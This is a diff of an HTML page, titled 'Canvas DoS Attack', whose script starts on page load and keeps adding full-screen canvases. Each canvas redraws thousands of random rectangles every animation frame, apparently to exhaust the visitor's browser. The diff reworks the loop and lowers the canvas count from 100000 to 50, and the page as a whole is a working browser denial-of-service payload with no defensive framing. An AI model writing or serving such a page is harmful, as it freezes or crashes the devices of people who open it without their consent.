@@ -1,40 +1,43 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Canvas DoS on Load</title>
+  <title>Canvas DoS Attack</title>
 </head>
 <body>
 <script>
 window.onload = function() {
   function overloadCanvas() {
-    const canvasCount = 100000; // How many canvases we want to overload with.
+    const canvasCount = 50;  // Increase number of canvases
     let counter = 0;
-    let interval = setInterval(() => {
-        if (counter >= canvasCount) {
-            clearInterval(interval);
+
+    function createCanvas() {
+      const canvas = document.createElement('canvas');
+      canvas.width = window.innerWidth;  // Full screen width
+      canvas.height = window.innerHeight;  // Full screen height
+      const ctx = canvas.getContext('2d');
+
+      // Random animation on canvas
+      function draw() {
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
+        for (let i = 0; i < 2000; i++) {  // Increase number of random shapes
+          ctx.fillStyle = `rgb(${Math.random()*255}, ${Math.random()*255}, ${Math.random()*255})`;
+          ctx.fillRect(Math.random() * canvas.width, Math.random() * canvas.height, 100, 100);
         }
-        const canvas = document.createElement('canvas');
-        canvas.width = window.innerWidth;  // Full screen width
-        canvas.height = window.innerHeight;  // Full screen height
-        const ctx = canvas.getContext('2d');
-        
-        // Randomly animate shapes on canvas
-        function draw() {
-          ctx.clearRect(0, 0, canvas.width, canvas.height); // Clear each frame
-          for (let i = 0; i < 1000; i++) {  // Increase the number of random objects
-              ctx.fillStyle = `rgb(${Math.random()*255}, ${Math.random()*255}, ${Math.random()*255})`;
-              ctx.fillRect(Math.random() * canvas.width, Math.random() * canvas.height, 100, 100);
-          }
-          requestAnimationFrame(draw);  // Continue the animation loop
-        }
-        
-        document.body.appendChild(canvas);
-        draw();  // Start the animation for the canvas
-        counter++;
-    }, 100);  // Delay canvas creation to prevent browser crash from initial overload
+        requestAnimationFrame(draw);  // Continue animation loop
+      }
+
+      document.body.appendChild(canvas);
+      draw();  // Start animation loop
+      counter++;
+      if (counter < canvasCount) {
+        setTimeout(createCanvas, 100);  // Add a slight delay before creating more canvases
+      }
+    }
+
+    createCanvas();  // Begin canvas creation
   }
-  
-  overloadCanvas();
+
+  overloadCanvas();  // Start the overload
 };
 </script>
 </body>
